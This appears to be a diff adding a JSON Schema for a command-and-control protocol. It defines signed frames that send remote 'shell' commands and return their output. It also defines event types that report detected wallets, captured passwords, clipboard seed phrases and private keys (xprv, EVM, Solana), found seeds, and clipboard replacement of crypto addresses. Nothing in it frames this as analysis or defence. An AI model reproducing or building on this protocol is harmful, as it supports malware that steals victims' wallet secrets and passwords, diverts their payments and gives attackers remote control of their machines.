+          "data": {
+            "words": 12,
+            "value": "abandon ability able about above absent absorb abstract absurd abuse access accident"
+          },
+          "legacy": "seed encontrada: 12 palabras"
+        }
+      ]
+    },
+    "ack": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "reply_to"
+      ],
+      "properties": {
+        "reply_to": {
+          "type": "string",
+          "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+          "examples": [
+            "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+          ]
+        }
+      },
+      "examples": [
+        {
+          "reply_to": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+        }
+      ]
+    },
+    "ping": {
+      "type": "object",
+      "additionalProperties": false,
+      "examples": [
+        {}
+      ]
+    },
+    "pong": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "reply_to"
+      ],
+      "properties": {
+        "reply_to": {
+          "type": "string",
+          "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+          "examples": [
+            "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+          ]
+        }
+      },
+      "examples": [
+        {
+          "reply_to": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+        }
+      ]
+    },
+    "bye": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "code",
+        "reason"
+      ],
+      "properties": {
+        "code": {
+          "enum": [
+            1000,
+            4400,
+            4401,
+            4403,
+            4408,
+            4409,
+            4429
+          ]
+        },
+        "reason": {
+          "type": "string",
+          "maxLength": 512
+        }
+      },
+      "examples": [
+        {
+          "code": 4408,
+          "reason": "pong timeout"
+        }
+      ]
+    },
+    "eventData_event": {
+      "allOf": [
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "wallet_detected"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false,
+                "required": [
+                  "name",
+                  "pid"
+                ],
+                "properties": {
+                  "name": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 128
+                  },
+                  "pid": {
+                    "type": "integer",
+                    "minimum": 1
+                  }
+                }
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "wallet_closed"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "password"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false,
+                "required": [
+                  "process",
+                  "title",
+                  "text"
+                ],
+                "properties": {
+                  "process": {
+                    "type": "string",
+                    "maxLength": 260
+                  },
+                  "title": {
+                    "type": "string",
+                    "maxLength": 512
+                  },
+                  "text": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 4096
+                  }
+                }
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "clipboard_secret"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false,
+                "required": [
+                  "kind",
+                  "value"
+                ],
+                "properties": {
+                  "kind": {
+                    "enum": [
+                      "seed-12",
+                      "seed-24",
+                      "xprv",
+                      "evm-key",
+                      "solana-key",
+                      "password"
+                    ]
+                  },
+                  "value": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 4096
+                  },
+                  "process": {
+                    "type": "string",
+                    "maxLength": 260
+                  },
+                  "title": {
+                    "type": "string",
+                    "maxLength": 512
+                  },
+                  "words": {
+                    "type": "integer",
+                    "enum": [
+                      12,
+                      18,
+                      24
+                    ]
+                  }
+                }
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "clipboard_replace"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false,
+                "required": [
+                  "coin",
+                  "original",
+                  "replacement"
+                ],
+                "properties": {
+                  "coin": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 16
+                  },
+                  "original": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 256
+                  },
+                  "replacement": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 256
+                  }
+                }
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "kind": {
+                "const": "seed_found"
+              }
+            },
+            "required": [
+              "kind"
+            ]
+          },
+          "then": {
+            "properties": {
+              "data": {
+                "type": "object",
+                "additionalProperties": false,
+                "required": [
+                  "words",
+                  "value"
+                ],
+                "properties": {
+                  "words": {
+                    "type": "integer",
+                    "enum": [
+                      12,
+                      18,
+                      24
+                    ]
+                  },
+                  "value": {
+                    "type": "string",
+                    "minLength": 1,
+                    "maxLength": 4096
+                  }
+                }
+              }
+            }
+          }
+        }
+      ]
+    },
+    "frames": {
+      "type": "array",
+      "items": {
+        "$ref": "#"
+      },
+      "examples": [
+        [
+          {
+            "v": 1,
+            "id": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77",
+            "seq": 1841,
+            "ts": 1767225600,
+            "type": "cmd",
+            "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+            "name": "shell",
+            "args": {
+              "command": "whoami"
+            },
+            "task_id": "9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60",
+            "timeout_ms": 65000,
+            "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+          },
+          {
+            "v": 1,
+            "id": "5a1d2e3f-4b5c-4d6e-8f70-8192a3b4c5d6",
+            "seq": 12,
+            "ts": 1767225601,
+            "type": "ack",
+            "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+            "reply_to": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77",
+            "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+          },
+          {
+            "v": 1,
+            "id": "6b2e3f40-5c6d-4e7f-9a81-92a3b4c5d6e7",
+            "seq": 7,
+            "ts": 1767225602,
+            "type": "bye",
+            "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+            "code": 4429,
+            "reason": "retry_after_ms=2000",
+            "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+          },
+          {
+            "v": 1,
+            "id": "7c3f4a51-6d7e-4f80-9b92-a3b4c5d6e7f8",
+            "seq": 13,
+            "ts": 1767225603,
+            "type": "result",
+            "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+            "reply_to": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77",
+            "body": {
+              "status": "ok",
+              "error": null,
+              "result": {
+                "exit": 0,
+                "output": "desktop\\alice"
+              },
+              "artifacts": []
+            },
+            "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+          }
+        ]
+      ]
+    },
+    "negative_examples": {
+      "type": "array",
+      "description": "Repeated nonce is schema-valid but violates section 2. v:2 must fail the envelope.",
+      "items": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": [
+          "why",
+          "frame"
+        ],
+        "properties": {
+          "why": {
+            "type": "string"
+          },
+          "frame": {
+            "$ref": "#"
+          }
+        }
+      },
+      "examples": [
+        [
+          {
+            "why": "second frame of the connection repeats the first nonce (same direction)",
+            "frame": {
+              "v": 1,
+              "id": "1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d",
+              "seq": 1842,
+              "ts": 1767225600,
+              "type": "cmd",
+              "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+              "name": "shell",
+              "args": {
+                "command": "whoami"
+              },
+              "task_id": "9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60",
+              "timeout_ms": 65000,
+              "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+            }
+          },
+          {
+            "why": "v:2 unsupported",
+            "frame": {
+              "v": 2,
+              "id": "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77",
+              "seq": 1841,
+              "ts": 1767225600,
+              "type": "cmd",
+              "nonce": "QEFCQ0RFRkdISUpLTE1OTw",
+              "name": "shell",
+              "args": {
+                "command": "whoami"
+              },
+              "task_id": "9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60",
+              "timeout_ms": 65000,
+              "sig": "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+            }
+          }
+        ]
+      ]
+    },
+    "resultBody": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "status",
+        "result"
+      ],
+      "properties": {
+        "status": {
+          "enum": [
+            "ok",
+            "error",
+            "cancelled"
+          ]
+        },
+        "error": {
+          "type": [
+            "string",
+            "null"
+          ],
+          "maxLength": 2000
+        },
+        "result": {
+          "type": "object"
+        },
+        "artifacts": {
+          "type": "array",
+          "maxItems": 32,
+          "items": {
+            "type": "object",
+            "additionalProperties": false,
+            "required": [
+              "upload_request"
+            ],
+            "properties": {
+              "upload_request": {
+                "$ref": "#/definitions/uuid"
+              }
+            }
+          }
+        }
+      },
+      "examples": [
+        {
+          "status": "ok",
+          "error": null,
+          "result": {
+            "exit": 0,
+            "output": "desktop\\alice"
+          },
+          "artifacts": []
+        },
+        {
+          "status": "error",
+          "error": "busy",
+          "result": {},
+          "artifacts": []
+        },
+        {
+          "status": "ok",
+          "error": null,
+          "result": {
+            "http_result": true
+          },
+          "artifacts": []
+        }
+      ]
+    }
+  }
+}
